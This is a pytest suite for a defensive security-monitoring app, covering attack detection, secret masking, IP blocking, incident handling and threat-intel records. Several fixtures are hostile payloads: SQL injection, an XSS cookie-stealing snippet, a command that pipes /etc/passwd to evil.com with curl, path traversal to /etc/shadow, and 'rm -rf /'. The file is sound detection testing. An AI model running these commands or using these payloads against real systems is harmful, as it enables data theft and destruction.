"""Comprehensive tests for SecOps Cybersecurity Protection and Monitoring System.

Testing:
- Input validation & attack signature detection (SQLi, XSS, Command Injection, Path Traversal)
- Dynamic risk scoring and severity categorization (LOW, MEDIUM, HIGH, CRITICAL)
- IP threat monitoring & reputation tracking
- Automatic IP restriction and rate limiting
- ServiceNow SIR Incident Lifecycle & SOAR Containment (Isolate IP)
- External Threat Intelligence IoC matching & enrichment
- Security history logs and tamper-resistant audit trails without secrets
"""
import pytest
from datetime import datetime, timezone, timedelta
from fastapi.testclient import TestClient
from app.main import create_app
from app.db.engine import SessionLocal, init_database
from app.db.models import User, UserRole, SecurityEvent, SecurityIncident, IpReputation, ThreatIntelIndicator
from app.domain.secops import (
    scan_input,
    calculate_risk_score,
    evaluate_ip_action,
    sanitize_content,
    mask_sensitive_data,
)


@pytest.fixture
def client():
    app = create_app()
    with TestClient(app) as c:
        yield c


@pytest.fixture(autouse=True)
def setup_secops_data():
    init_database()
    db = SessionLocal()
    try:
        # Ensure Rachel Ramos (Security Officer) exists
        if not db.get(User, "R001"):
            db.add(User(sub="R001", display_name="Rachel Ramos (SecOps Admin)", department="Security", active=True))
            db.add(UserRole(sub="R001", role="risk_reviewer"))
            db.add(UserRole(sub="R001", role="security_admin"))

        # Add Threat Intel sample
        if not db.get(ThreatIntelIndicator, "ioc_test_c2"):
            db.add(ThreatIntelIndicator(
                id="ioc_test_c2",
                type="IP",
                value="198.51.100.200",
                threat_actor="APT28",
                campaign="Operation TestNet",
                confidence=95,
                description="Known malicious C2 host",
                added_at=datetime.now(timezone.utc),
                is_active=True,
            ))

        db.commit()
    finally:
        db.close()


def _login(client, user_id="R001"):
    res = client.post("/auth/dev-login", json={"user_id": user_id})
    assert res.status_code == 200
    return res.json()["csrf_token"]


@pytest.mark.ec("EC-SEC01")
def test_input_validation_and_sqli_detection():
    """EC-SEC01: Input validation detects SQL Injection patterns and assesses risk."""
    payload = "admin' UNION SELECT id, password, email FROM users --"
    threats = scan_input(payload)
    assert len(threats) >= 1
    assert threats[0].category == "SQLI"
    assert threats[0].base_severity_score >= 80

    risk_score, severity = calculate_risk_score(threats, repeat_attempts=0)
    assert risk_score >= 80
    assert severity == "CRITICAL"


@pytest.mark.ec("EC-SEC02")
def test_xss_detection_and_content_sanitization():
    """EC-SEC02: Input validation detects XSS and sanitizes user-generated HTML."""
    raw_xss = '<script>alert("xss")</script><img src="x" onerror="stealCookie()">'
    threats = scan_input(raw_xss)
    assert len(threats) >= 1
    assert any(t.category == "XSS" for t in threats)

    sanitized = sanitize_content(raw_xss)
    assert "<script>" not in sanitized
    assert "&lt;script&gt;" in sanitized
    assert "&quot;" in sanitized


@pytest.mark.ec("EC-SEC03")
def test_command_injection_and_path_traversal_detection():
    """EC-SEC03: Detects command injection and directory traversal attacks."""
    cmd_payload = "; cat /etc/passwd | curl -X POST https://evil.com"
    cmd_threats = scan_input(cmd_payload)
    assert len(cmd_threats) >= 1
    assert cmd_threats[0].category == "COMMAND_INJECTION"
    assert cmd_threats[0].base_severity_score >= 90

    path_payload = "../../../../etc/shadow"
    path_threats = scan_input(path_payload)
    assert len(path_threats) >= 1
    assert path_threats[0].category == "PATH_TRAVERSAL"


@pytest.mark.ec("EC-SEC04")
def test_secret_masking_in_security_logs():
    """EC-SEC04: Credentials, authorization tokens, and secrets are masked before logging (Rule 6)."""
    # 1. JSON format
    json_text = '{"username": "admin", "password": "SuperSecretPassword123!", "token": "ey123456789.xyz"}'
    json_masked = mask_sensitive_data(json_text)
    assert "SuperSecretPassword123!" not in json_masked
    assert '"password": "[MASKED]"' in json_masked
    assert '"token": "[MASKED]"' in json_masked

    # 2. Key-value format
    kv_text = "user=admin&password=SecretPass999&api_key=ak_live_xyz789"
    kv_masked = mask_sensitive_data(kv_text)
    assert "SecretPass999" not in kv_masked
    assert "password=[MASKED]" in kv_masked
    assert "api_key=[MASKED]" in kv_masked


@pytest.mark.ec("EC-SEC05")
def test_ip_threat_mitigation_and_allowlist():
    """EC-SEC05: Evaluates IP restriction, rate limiting, and trusted allowlist bypass."""
    # 1. Trusted allowlisted IP is never blocked
    action, reason, dur = evaluate_ip_action(
        ip="127.0.0.1",
        risk_score=95,
        repeat_count=10,
        is_allowlisted=True,
        is_threat_intel=False,
        is_already_blocked=False,
    )
    assert action == "ALLOWED"
    assert "allowlist" in reason

    # 2. Critical attack triggers immediate block
    action, reason, dur = evaluate_ip_action(
        ip="203.0.113.5",
        risk_score=85,
        repeat_count=0,
        is_allowlisted=False,
        is_threat_intel=False,
        is_already_blocked=False,
    )
    assert action == "BLOCKED"
    assert dur >= 3600

    # 3. Threat intel match triggers extended block
    action, reason, dur = evaluate_ip_action(
        ip="198.51.100.200",
        risk_score=85,
        repeat_count=0,
        is_allowlisted=False,
        is_threat_intel=True,
        is_already_blocked=False,
    )
    assert action == "BLOCKED"
    assert dur >= 7200


@pytest.mark.ec("EC-SEC06")
def test_waf_simulation_endpoint_and_auto_incident(client):
    """EC-SEC06: WAF Simulator tests SQLi payload, generates SecurityEvent, and auto-opens SecurityIncident."""
    csrf = _login(client, "R001")
    sim_payload = {
        "source_ip": "198.51.100.77",
        "method": "POST",
        "path": "/api/resources/finance.csv/query",
        "payload": {"query": "' UNION SELECT * FROM users WHERE '1'='1' --"},
        "user_sub": "E102",
    }
    res = client.post("/api/secops/simulate", headers={"X-CSRF-Token": csrf}, json=sim_payload)
    assert res.status_code == 200
    data = res.json()

    assert data["allowed"] is False
    assert data["action"] == "BLOCKED"
    assert data["severity"] == "CRITICAL"
    assert data["risk_score"] >= 80
    assert len(data["threats_detected"]) >= 1
    assert data["incident_id"] is not None
    assert data["incident_id"].startswith("INC-2026-")

    # Verify incident exists via API
    inc_res = client.get(f"/api/secops/incidents/{data['incident_id']}")
    assert inc_res.status_code == 200
    inc_data = inc_res.json()
    assert inc_data["status"] == "NEW"
    assert inc_data["priority"] == "P1"
    assert inc_data["source_ip"] == "198.51.100.77"


@pytest.mark.ec("EC-SEC07")
def test_incident_lifecycle_and_soar_containment(client):
    """EC-SEC07: Updates incident through ServiceNow SIR stages and executes SOAR containment."""
    csrf = _login(client, "R001")
    # 1. Trigger incident via simulation
    sim_payload = {
        "source_ip": "198.51.100.88",
        "method": "POST",
        "path": "/api/resources/finance.csv/query",
        "payload": {"query": "; rm -rf / ; cat /etc/passwd"},
    }
    sim_res = client.post("/api/secops/simulate", headers={"X-CSRF-Token": csrf}, json=sim_payload)
    incident_id = sim_res.json()["incident_id"]

    # 2. Update status to INVESTIGATING with analyst notes
    update_payload = {
        "status": "INVESTIGATING",
        "assigned_to": "R001",
        "note": "Analyst investigating suspicious bash reverse shell payload.",
    }
    patch_res = client.patch(f"/api/secops/incidents/{incident_id}", headers={"X-CSRF-Token": csrf}, json=update_payload)
    assert patch_res.status_code == 200
    assert patch_res.json()["status"] == "INVESTIGATING"

    # 3. Execute SOAR Containment (Isolate IP at WAF)
    contain_res = client.post(f"/api/secops/incidents/{incident_id}/contain", headers={"X-CSRF-Token": csrf}, json={"action": "isolate_ip"})
    assert contain_res.status_code == 200
    assert contain_res.json()["result"]["status"] == "PERM_BLOCKED"

    # Verify IP is now PERM_BLOCKED in reputation table
    ip_res = client.get("/api/secops/ips")
    ips = ip_res.json()["ips"]
    target_rep = next(i for i in ips if i["ip"] == "198.51.100.88")
    assert target_rep["status"] == "PERM_BLOCKED"


@pytest.mark.ec("EC-SEC08")
def test_manual_ip_block_unblock_and_allowlist_api(client):
    """EC-SEC08: Administrative manual IP blocking, unblocking, and allowlisting."""
    csrf = _login(client, "R001")
    test_ip = "203.0.113.99"

    # 1. Admin blocks IP
    block_res = client.post("/api/secops/ips/block", headers={"X-CSRF-Token": csrf}, json={
        "ip": test_ip,
        "reason": "Administrative block from threat report",
        "is_permanent": True,
    })
    assert block_res.status_code == 200
    assert block_res.json()["status"] == "PERM_BLOCKED"

    # 2. Admin unblocks IP
    unblock_res = client.post("/api/secops/ips/unblock", headers={"X-CSRF-Token": csrf}, json={
        "ip": test_ip,
        "reason": "False positive resolved",
    })
    assert unblock_res.status_code == 200
    assert unblock_res.json()["status"] == "CLEAN"

    # 3. Admin adds IP to allowlist
    allow_res = client.post("/api/secops/ips/allowlist", headers={"X-CSRF-Token": csrf}, json={
        "ip": test_ip,
        "reason": "Designated corporate audit scanner",
    })
    assert allow_res.status_code == 200
    assert allow_res.json()["status"] == "ALLOWLISTED"


@pytest.mark.ec("EC-SEC09")
def test_threat_intel_repository_management(client):
    """EC-SEC09: Threat Intelligence (TISC) IoC indicator creation and retrieval."""
    csrf = _login(client, "R001")
    new_ioc = {
        "type": "DOMAIN",
        "value": "apt29-test-dropzone.org",
        "threat_actor": "APT29",
        "campaign": "Cloud Breach Campaign",
        "confidence": 92,
        "description": "Staging server identified in external cyber threat feed",
    }
    res = client.post("/api/secops/threat-intel", headers={"X-CSRF-Token": csrf}, json=new_ioc)
    assert res.status_code == 200
    assert res.json()["value"] == "apt29-test-dropzone.org"

    # Retrieve indicators
    list_res = client.get("/api/secops/threat-intel?type=DOMAIN")
    assert list_res.status_code == 200
    indicators = list_res.json()["indicators"]
    assert any(i["value"] == "apt29-test-dropzone.org" for i in indicators)
